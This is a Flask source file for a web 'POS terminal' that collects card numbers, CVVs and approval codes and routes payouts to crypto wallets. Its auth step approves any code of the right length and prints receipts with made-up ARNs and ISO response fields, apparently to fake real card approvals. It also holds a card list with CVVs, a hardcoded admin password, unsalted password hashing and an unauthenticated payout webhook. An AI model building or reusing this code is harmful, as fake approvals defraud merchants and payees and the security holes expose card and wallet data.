
from flask import Flask, render_template, render_template_string, request, redirect, session, url_for, send_file, flash, jsonify
import random, logging, qrcode, io, os, json, hashlib, re
from datetime import datetime
from functools import wraps

# -------- New: DB setup (Render-friendly) --------
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'change-me-in-env')  # Render: set SECRET_KEY env var
logging.basicConfig(level=logging.INFO)

# -------- New: Config & DB --------
PASSWORD_FILE = os.getenv('PASSWORD_FILE', 'password.json')
DATABASE_URL = os.getenv('DATABASE_URL', 'sqlite:///app.db')  # Render: set to Postgres URL
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# New: simple gas & payout config (tweak via env)
MAX_GAS_USD = float(os.getenv('MAX_GAS_USD', '5.0'))           # hard cap on gas in USD
MAX_GAS_PCT = float(os.getenv('MAX_GAS_PCT', '1.5'))           # gas cannot exceed this % of fiat amount
DEFAULT_CHAIN = os.getenv('DEFAULT_CHAIN', 'ERC20')            # fallback chain if merchant not configured

# -------- Existing auth config (kept) --------
USERNAME = "admin"
PASSWORD = "Br_3339"  # username is still checked, password hash stored in file

# Ensure password file exists
if not os.path.exists(PASSWORD_FILE):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256("admin123".encode()).hexdigest()
        json.dump({"password": hashed}, f)

def check_password(raw):
    with open(PASSWORD_FILE) as f:
        stored = json.load(f)['password']
    return hashlib.sha256(raw.encode()).hexdigest() == stored

def set_password(newpass):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256(newpass.encode()).hexdigest()
        json.dump({"password": hashed}, f)

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            flash("You must be logged in.")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

# -------- New: Database models --------
class Transaction(db.Model):
    __tablename__ = 'transactions'
    id = db.Column(db.Integer, primary_key=True)
    mti = db.Column(db.String(4))
    rrn = db.Column(db.String(12))        # F37
    stan = db.Column(db.String(6))         # F11
    arn = db.Column(db.String(20))         # optional
    mid = db.Column(db.String(32))         # F42
    tid = db.Column(db.String(16))         # F41
    amount = db.Column(db.String(16))      # store raw cents string (F4) to avoid float issues
    currency = db.Column(db.String(3))     # F49
    field39 = db.Column(db.String(2))      # approval code (00 = approved)
    payout_chain = db.Column(db.String(16))# ERC20/TRC20
    wallet_address = db.Column(db.String(128))
    tx_hash = db.Column(db.String(128))    # blockchain tx id (if payout sent)
    status = db.Column(db.String(32))      # 'approved', 'declined', 'payout_sent', 'payout_failed'
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class MerchantWallet(db.Model):
    __tablename__ = 'merchant_wallets'
    id = db.Column(db.Integer, primary_key=True)
    mid = db.Column(db.String(32), index=True)   # merchant ID (ISO F42)
    chain = db.Column(db.String(16))             # 'ERC20' or 'TRC20'
    address = db.Column(db.String(128))
    active = db.Column(db.Boolean, default=True)

with app.app_context():
    db.create_all()

# -------- Dummy card database (left as-is) --------
DUMMY_CARDS = {
    "4114755393849011": {"expiry": "0926", "cvv": "363", "auth": "1942", "type": "POS-101.1"},
    "4000123412341234": {"expiry": "1126", "cvv": "123", "auth": "4021", "type": "POS-101.1"},
    "4117459374038454": {"expiry": "1026", "cvv": "258", "auth": "384726", "type": "POS-101.4"},
    "4123456789012345": {"expiry": "0826", "cvv": "852", "auth": "495128", "type": "POS-101.4"},
    "5454957994741066": {"expiry": "1126", "cvv": "746", "auth": "627192", "type": "POS-101.6"},
    "6011000990131077": {"expiry": "0825", "cvv": "330", "auth": "8765", "type": "POS-101.7"},
    "3782822463101088": {"expiry": "1226", "cvv": "1059", "auth": "0000", "type": "POS-101.8"},
    "3530760473041099": {"expiry": "0326", "cvv": "244", "auth": "712398", "type": "POS-201.1"},
    "4114938274651920": {"expiry": "0926", "cvv": "463", "auth": "3127", "type": "POS-101.1"},
    "4001948263728191": {"expiry": "1026", "cvv": "291", "auth": "574802", "type": "POS-101.4"},
    "6011329481720394": {"expiry": "0825", "cvv": "310", "auth": "8891", "type": "POS-101.7"},
    "378282246310106":  {"expiry": "1226", "cvv": "1439", "auth": "0000", "type": "POS-101.8"},
    "3531540982734612": {"expiry": "0326", "cvv": "284", "auth": "914728", "type": "POS-201.1"},
    "5456038291736482": {"expiry": "1126", "cvv": "762", "auth": "695321", "type": "POS-201.3"},
    "4118729301748291": {"expiry": "1026", "cvv": "249", "auth": "417263", "type": "POS-201.5"}
}

PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval)": 4,
    "POS Terminal -101.4 (6-digit approval)": 6,
    "POS Terminal -101.6 (Pre-authorization)": 6,
    "POS Terminal -101.7 (4-digit approval)": 4,
    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
    "POS Terminal -201.1 (6-digit approval)": 6,
    "POS Terminal -201.3 (6-digit approval)": 6,
    "POS Terminal -201.5 (6-digit approval)": 6
}

FIELD_39_RESPONSES = {
    "05": "Do Not Honor",
    "14": "Terminal unable to resolve encrypted session state. Contact card issuer",
    "54": "Expired Card",
    "82": "Invalid CVV",
    "91": "Issuer Inoperative",
    "92": "Invalid Terminal Protocol"
}

# -------- Helpers: backend wallet lookup & payout with gas rules --------
def get_wallet_for_merchant(mid: str, chain: str):
    w = MerchantWallet.query.filter_by(mid=mid, chain=chain, active=True).first()
    return w.address if w else None

def estimate_gas_usd(chain: str) -> float:
    """Placeholder: in production query your provider for real-time gas.
    We return a conservative static estimate to enforce strict caps."""
    return 0.50 if chain.upper() == 'TRC20' else 1.50  # rough static guardrail

def trigger_crypto_payout(mid: str, amount_minor: str, currency: str, chain: str) -> dict:
    """Apply strict gas rules and *simulate* a payout. Replace with your real sender."""
    wallet = get_wallet_for_merchant(mid, chain) or ''
    if not wallet:
        return {"ok": False, "err": f"No active {chain} wallet configured for MID {mid}"}

    # amount_minor is ISO F4 (cents). Convert to whole currency for ratio checks.
    try:
        amt = int(amount_minor) / 100.0
    except Exception:
        amt = 0.0

    est_gas = estimate_gas_usd(chain)
    # Cap 1: absolute gas dollars
    if est_gas > MAX_GAS_USD:
        return {"ok": False, "err": f"Gas {est_gas} exceeds hard cap {MAX_GAS_USD}"}
    # Cap 2: percentage of fiat amount (skip if amount is tiny)
    if amt > 0 and (est_gas / max(amt, 0.01)) * 100.0 > MAX_GAS_PCT:
        return {"ok": False, "err": f"Gas {est_gas} exceeds {MAX_GAS_PCT}% of amount {amt}"}

    # Simulate success — plug your provider API here (Fireblocks/BitGo/etc.)
    tx_hash = f"SIMULATED_{chain}_TX_{random.randint(100000, 999999)}"
    return {"ok": True, "tx_hash": tx_hash, "wallet": wallet}

# -------- Routes (existing + new) --------
@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        passwd = request.form.get('password')
        if user == USERNAME and check_password(passwd):
            session['logged_in'] = True
            return redirect(url_for('protocol'))
        flash("Invalid username or password.")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    flash("You have been logged out.")
    return redirect(url_for('login'))

@app.route('/change-password', methods=['GET', 'POST'])
@login_required
def change_password():
    if request.method == 'POST':
        current = request.form['current']
        new = request.form['new']
        if not check_password(current):
            return render_template('change_password.html', error="Current password incorrect.")
        set_password(new)
        return render_template('change_password.html', success="Password changed.")
    return render_template('change_password.html')

@app.route('/protocol', methods=['GET', 'POST'])
@login_required
def protocol():
    if request.method == 'POST':
        selected = request.form.get('protocol')
        if selected not in PROTOCOLS:
            return redirect(url_for('rejected', code="92", reason=FIELD_39_RESPONSES["92"]))
        session['protocol'] = selected
        session['code_length'] = PROTOCOLS[selected]
        return redirect(url_for('amount'))
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'])
@login_required
def amount():
    if request.method == 'POST':
        session['amount'] = request.form.get('amount')
        return redirect(url_for('payout'))
    return render_template('amount.html')

@app.route('/payout', methods=['GET', 'POST'])
@login_required
def payout():
    if request.method == 'POST':
        method = request.form['method']
        session['payout_type'] = method

        # NOTE: For backend-controlled wallets, we no longer accept arbitrary wallet input here.
        # We bind a demo MID for UI flow and pull wallet from backend if configured.
        session['mid'] = os.getenv('DEMO_MID', 'DEMO_MID_001')
        wallet_from_backend = get_wallet_for_merchant(session['mid'], method)

        if not wallet_from_backend:
            flash(f"No {method} wallet configured for merchant {session['mid']} (backend)."
                  " Ask admin to set it in DB.")
            return redirect(url_for('payout'))

        session['wallet'] = wallet_from_backend
        return redirect(url_for('card'))

    return render_template('payout.html')

@app.route('/card', methods=['GET', 'POST'])
@login_required
def card():
    # TEMPORARY CARD ACCEPTANCE LOGIC (unchanged)
    if request.method == 'POST':
        pan = request.form['pan'].replace(" ", "")
        exp = request.form['expiry'].replace("/", "")
        cvv = request.form['cvv']
        session.update({'pan': pan, 'exp': exp, 'cvv': cvv})

        # Card type inference for receipt
        if pan.startswith("4"):
            session['card_type'] = "VISA"
        elif pan.startswith("5"):
            session['card_type'] = "MASTERCARD"
        elif pan.startswith("3"):
            session['card_type'] = "AMEX"
        elif pan.startswith("6"):
            session['card_type'] = "DISCOVER"
        else:
            session['card_type'] = "UNKNOWN"

        return redirect(url_for('auth'))

    return render_template('card.html')

@app.route('/auth', methods=['GET', 'POST'])
@login_required
def auth():
    expected_length = session.get('code_length', 6)

    # TEMPORARY UNIVERSAL SUCCESS LOGIC (unchanged)
    if request.method == 'POST':
        code = request.form.get('auth')
        if len(code) != expected_length:
            return render_template('auth.html', warning=f"Code must be {expected_length} digits.")

        txn_id = f"TXN{random.randint(100000, 999999)}"
        arn = f"ARN{random.randint(100000000000, 999999999999)}"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        field39 = "00"

        session.update({
            "txn_id": txn_id,
            "arn": arn,
            "timestamp": timestamp,
            "field39": field39
        })

        # Save transaction in DB for monitoring
        t = Transaction(
            mti='0210', rrn=None, stan=None, arn=arn,
            mid=session.get('mid', 'DEMO_MID_001'), tid='DEMO_TID_001',
            amount=str(int(session.get('amount', '0')) * 100),  # store cents
            currency='USD', field39='00',
            payout_chain=session.get('payout_type', DEFAULT_CHAIN),
            wallet_address=session.get('wallet'), status='approved'
        )
        db.session.add(t); db.session.commit()

        return redirect(url_for('success'))

    return render_template('auth.html')

@app.route('/success')
@login_required
def success():
    return render_template('success.html',
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan", "")[-4:],
        amount=session.get("amount"),
        timestamp=session.get("timestamp")
    )

@app.route("/receipt")
def receipt():
    raw_protocol = session.get("protocol", "")
    match = re.search(r"-(\d+\.\d+)\s+\((\d+)-digit", raw_protocol)
    if match:
        protocol_version = match.group(1)
        auth_digits = int(match.group(2))
    else:
        protocol_version = "Unknown"
        auth_digits = 4

    raw_amount = session.get("amount", "0")
    if raw_amount and raw_amount.isdigit():
        amount_fmt = f"{int(raw_amount):,}.00"
    else:
        amount_fmt = "0.00"

    return render_template("receipt.html",
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan")[-4:],
        amount=amount_fmt,
        payout=session.get("payout_type"),
        wallet=session.get("wallet"),
        auth_code="*" * auth_digits,
        iso_field_18="5999",
        iso_field_25="00",
        field39="00",
        card_type=session.get("card_type", "VISA"),
        protocol_version=protocol_version,
        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    )

@app.route('/rejected')
def rejected():
    return render_template('rejected.html',
        code=request.args.get("code"),
        reason=request.args.get("reason", "Transaction Declined")
    )

@app.route("/licence")
def licence():
    return render_template("licence.html")

@app.route('/offline')
@login_required
def offline():
    return render_template('offline.html')

# -------- New: ISO 8583 webhook from separate server --------
@app.route('/iso-webhook', methods=['POST'])
def iso_webhook():
    """The separate ISO-8583 TCP server POSTs approved/declined auth responses here.
    Expected JSON keys: mti, 39, 4, 37, 11, 41, 42, 49, arn (optional)"""
    data = request.get_json(force=True, silent=True) or {}
    mti = str(data.get('mti', '')).zfill(4)
    f39 = str(data.get('39') or data.get('f39') or '')
    f4  = str(data.get('4')  or data.get('f4')  or '0')
    f37 = str(data.get('37') or data.get('f37') or '')
    f11 = str(data.get('11') or data.get('f11') or '')
    f41 = str(data.get('41') or data.get('f41') or '')
    f42 = str(data.get('42') or data.get('f42') or '')
    f49 = str(data.get('49') or data.get('f49') or 'XXX')
    arn = str(data.get('arn') or '')

    status = 'approved' if f39 == '00' else 'declined'

    # Decide chain by merchant config
    chain = DEFAULT_CHAIN
    w = MerchantWallet.query.filter_by(mid=f42, active=True).first()
    if w:
        chain = w.chain

    wallet = get_wallet_for_merchant(f42, chain)

    # Persist transaction
    t = Transaction(mti=mti, rrn=f37, stan=f11, arn=arn, mid=f42, tid=f41,
                    amount=f4, currency=f49, field39=f39, payout_chain=chain,
                    wallet_address=wallet, status=status)
    db.session.add(t); db.session.commit()

    # Trigger payout if approved, with strict gas caps
    txh = None
    if status == 'approved':
        res = trigger_crypto_payout(f42, f4, f49, chain)
        if res.get('ok'):
            txh = res.get('tx_hash')
            t.tx_hash = txh
            t.status = 'payout_sent'
            if res.get('wallet'):
                t.wallet_address = res.get('wallet')
        else:
            t.status = 'payout_failed'
            app.logger.error(f"Payout failed for MID {f42}: {res.get('err')}" )
        db.session.commit()

    return jsonify({
        "ok": True,
        "txn_id": t.id,
        "status": t.status,
        "tx_hash": txh,
        "wallet": t.wallet_address
    }), 200

# -------- New: Monitor UI (no external templates) --------
MONITOR_TEMPLATE = """
<!doctype html>
<html>
  <head>
    <meta charset='utf-8'>
    <title>Monitor</title>
    <style>
      body{font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; padding:20px;}
      table{border-collapse: collapse; width:100%;}
      th,td{border:1px solid #ddd; padding:8px; font-size:14px;}
      th{background:#f5f5f5; text-align:left;}
      .ok{color: #0a7a2d; font-weight:600;}
      .err{color: #a10; font-weight:600;}
      .muted{color:#666;}
      .mono{font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;}
    </style>
  </head>
  <body>
    <h2>Transaction Monitor</h2>
    <p class='muted'>Most recent {{ rows|length }} records.</p>
    <table>
      <thead>
        <tr>
          <th>ID</th><th>When (UTC)</th><th>MTI</th><th>MID/TID</th>
          <th>RRN/STAN</th><th>Amt (F4)</th><th>Cur</th><th>39</th>
          <th>Chain</th><th>Wallet</th><th>Status</th><th>TX Hash</th>
        </tr>
      </thead>
      <tbody>
        {% for r in rows %}
        <tr>
          <td class='mono'>{{ r.id }}</td>
          <td>{{ r.created_at.strftime('%Y-%m-%d %H:%M:%S') }}</td>
          <td class='mono'>{{ r.mti }}</td>
          <td class='mono'>{{ r.mid }}/{{ r.tid }}</td>
          <td class='mono'>{{ r.rrn }}/{{ r.stan }}</td>
          <td class='mono'>{{ r.amount }}</td>
          <td>{{ r.currency }}</td>
          <td class='mono'>{{ r.field39 }}</td>
          <td>{{ r.payout_chain }}</td>
          <td class='mono'>{{ (r.wallet_address or '')[:10] + '…' if r.wallet_address else '' }}</td>
          <td class='{{ 'ok' if r.status in ['approved','payout_sent'] else 'err' }}'>{{ r.status }}</td>
          <td class='mono'>{{ (r.tx_hash or '')[:14] + '…' if r.tx_hash else '' }}</td>
        </tr>
        {% endfor %}
      </tbody>
    </table>
  </body>
</html>
"""

@app.route('/monitor')
@login_required
def monitor():
    rows = Transaction.query.order_by(Transaction.created_at.desc()).limit(100).all()
    return render_template_string(MONITOR_TEMPLATE, rows=rows)

if __name__ == '__main__':
    # On Render, the platform provides PORT env var for HTTP. Flask uses it automatically via 'gunicorn'
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', '10000')), debug=False)

